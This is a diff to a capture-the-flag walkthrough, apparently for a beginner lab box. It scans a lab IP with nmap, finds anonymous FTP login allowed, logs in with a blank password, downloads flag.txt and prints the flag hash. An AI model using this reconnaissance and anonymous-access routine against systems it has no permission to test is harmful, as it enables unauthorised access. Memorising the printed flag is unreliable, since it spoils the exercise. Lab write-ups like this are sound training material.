@@ -27,23 +27,46 @@
 
 ---
 ## Solution:
-Get the flag from FTP Server:
+First, we need to scan the target with `nmap`.
+
+Command:
+`nmap -n -sC -sV 10.129.87.103`
+`-n`: No DNS look up (Good [OPSEC](https://en.wikipedia.org/wiki/Operations_security)).
+`-sC`: Run scripts during scan.
+`-sV`: Try to detect the version of running services.
 
 ```console
-┌──(kali㉿kali)-[~/Downloads]
-└─$ sudo nmap -sV -p T:20,21 10.129.87.103
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-12 07:47 EDT
+┌──(kali㉿kali)-[~]
+└─$ nmap -n -sC -sV 10.129.87.103
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 13:39 EDT
 Nmap scan report for 10.129.87.103
-Host is up (0.063s latency).
-
-PORT   STATE  SERVICE  VERSION
-20/tcp closed ftp-data
-21/tcp open   ftp      vsftpd 3.0.3
+Host is up (0.071s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.15
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
 Service Info: OS: Unix
+```
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
+An FTP server with anonymous login enabled and a file called `flag.txt`. We can use `ftp` to connect. 
 
+User:pass `anonymous:<BLANK>`
+
+```
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ ftp 10.129.87.103
 Connected to 10.129.87.103.
@@ -54,11 +77,13 @@ Password:
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
-ftp> ls
-229 Entering Extended Passive Mode (|||36440|)
-150 Here comes the directory listing.
--rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
-226 Directory send OK.
+```
+
+We can get the `flag.txt` file by using the `get` command.
+
+Type `exit` to gracefully close the connection afterwards.
+
+```
 ftp> get flag.txt
 local: flag.txt remote: flag.txt
 229 Entering Extended Passive Mode (|||36066|)
@@ -68,7 +93,11 @@ local: flag.txt remote: flag.txt
 32 bytes received in 00:00 (0.44 KiB/s)
 ftp> exit
 221 Goodbye.
-                           
+```
+
+To see what a file contains we can use `cat`.
+
+```
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ cat flag.txt
 035db21c881520061c53e0536e44f815
